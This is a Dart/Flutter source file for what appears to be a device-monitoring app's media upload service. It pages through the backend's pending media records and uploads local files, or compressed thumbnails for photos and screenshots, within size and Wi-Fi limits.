import 'dart:io';

import 'package:dio/dio.dart';
import 'package:flutter/foundation.dart';
import 'package:image/image.dart' as img;

import 'package:monitored_app/core/api/api_client.dart';
import 'package:monitored_app/core/services/connectivity_service.dart';

/// Uploads media files (and thumbnails) to the backend for media records
/// whose metadata was already synced but files are still TEMP.
///
/// Backend: POST /api/v1/media/{id}/upload/ — multipart fields `file`
/// (≤ 25 MB) and/or `thumbnail` (JPEG ≤ 200 KB). Backend auto-generates
/// thumbnail for photos when only `file` is provided.
class MediaUploadService {
  final ApiClient _apiClient;
  final ConnectivityService _connectivityService;

  MediaUploadService(this._apiClient, this._connectivityService);

  static const int _maxFileBytes = 25 * 1024 * 1024;
  static const int _maxThumbBytes = 200 * 1024;
  static const int _wifiOnlyThresholdBytes = 2 * 1024 * 1024;
  static const int _maxUploadsPerCycle = 10;

  bool _isRunning = false;

  /// Runs one upload cycle. Called after each successful media metadata sync
  /// and on the periodic sync timer.
  Future<void> uploadPendingMedia(String deviceId) async {
    if (_isRunning) {
      debugPrint('[MediaUpload] cycle skipped: already running');
      return;
    }
    _isRunning = true;
    try {
      final pending = await _fetchPendingMedia(deviceId);
      debugPrint('[MediaUpload] ${pending.length} TEMP media on backend');

      var uploaded = 0;
      for (final media in pending) {
        if (uploaded >= _maxUploadsPerCycle) break;
        if (await _uploadOne(media)) uploaded++;
      }
      debugPrint('[MediaUpload] cycle done: $uploaded uploads');
    } catch (e) {
      debugPrint('[MediaUpload] cycle failed: $e');
    } finally {
      _isRunning = false;
    }
  }

  /// Paginates through GET /media/?device=... and returns TEMP items.
  Future<List<Map<String, dynamic>>> _fetchPendingMedia(
    String deviceId,
  ) async {
    final items = <Map<String, dynamic>>[];
    String? url = '/media/';
    Map<String, dynamic>? params = {'device': deviceId};

    while (url != null) {
      final response = await _apiClient.get(url, queryParameters: params);
      final data = response.data as Map<String, dynamic>;
      for (final raw in (data['results'] as List<dynamic>? ?? const [])) {
        final item = Map<String, dynamic>.from(raw as Map);
        if (item['storage_status'] == 'TEMP') items.add(item);
      }
      // DRF `next` is an absolute URL; Dio handles absolute URLs correctly.
      url = data['next'] as String?;
      params = null;
    }
    return items;
  }

  /// Uploads one media item. Returns true when at least one part was sent.
  Future<bool> _uploadOne(Map<String, dynamic> media) async {
    final id = media['id']?.toString();
    // Backend may return the device-side path as `local_path` or `file_path`.
    final localPath =
        (media['local_path'] ?? media['file_path'])?.toString();
    final mediaType = media['media_type']?.toString() ?? '';
    if (id == null || localPath == null || localPath.isEmpty) return false;

    final file = File(localPath);
    if (!await file.exists()) {
      debugPrint('[MediaUpload] $id: local file missing ($localPath)');
      return false;
    }

    final fileSize = await file.length();
    final networkStatus = await _connectivityService.checkConnectivity();
    final isWifi = networkStatus == NetworkStatus.wifi;
    final canSendFile =
        fileSize <= _maxFileBytes && (fileSize <= _wifiOnlyThresholdBytes || isWifi);

    final formMap = <String, dynamic>{};

    if (canSendFile) {
      formMap['file'] = await MultipartFile.fromFile(
        localPath,
        filename: media['file_name']?.toString(),
      );
    }

    // Send client-side thumbnail when file is too large / on mobile network.
    // Backend can generate its own thumbnail from `file` when that is present;
    // client thumbnail covers the photo-only / low-connectivity case.
    if ((mediaType == 'PHOTO' || mediaType == 'SCREENSHOT') && !canSendFile) {
      final thumbBytes = await _buildThumbnail(file);
      if (thumbBytes != null) {
        formMap['thumbnail'] = MultipartFile.fromBytes(
          thumbBytes,
          filename: 'thumb_$id.jpg',
        );
      }
    }

    if (formMap.isEmpty) {
      debugPrint(
        '[MediaUpload] $id: nothing uploadable '
        '(size=$fileSize, wifi=$isWifi, type=$mediaType)',
      );
      return false;
    }

    try {
      await _apiClient.post(
        '/media/$id/upload/',
        data: FormData.fromMap(formMap),
      );
      debugPrint('[MediaUpload] $id uploaded (${formMap.keys.join('+')})');
      return true;
    } catch (e) {
      debugPrint('[MediaUpload] $id upload failed: $e');
      return false;
    }
  }

  /// Encodes a JPEG thumbnail ≤ 200 KB, max 320 px on longest side.
  /// Runs in a compute isolate so it does not block the UI.
  Future<Uint8List?> _buildThumbnail(File source) async {
    try {
      final bytes = await source.readAsBytes();
      return await compute(_encodeThumbnail, bytes);
    } catch (e) {
      debugPrint('[MediaUpload] thumbnail build failed: $e');
      return null;
    }
  }

  static Uint8List? _encodeThumbnail(Uint8List bytes) {
    final decoded = img.decodeImage(bytes);
    if (decoded == null) return null;
    final resized = img.copyResize(
      decoded,
      width: decoded.width >= decoded.height ? 320 : null,
      height: decoded.height > decoded.width ? 320 : null,
    );
    var quality = 70;
    var encoded = img.encodeJpg(resized, quality: quality);
    while (encoded.length > _maxThumbBytes && quality > 20) {
      quality -= 15;
      encoded = img.encodeJpg(resized, quality: quality);
    }
    return Uint8List.fromList(encoded);
  }
}
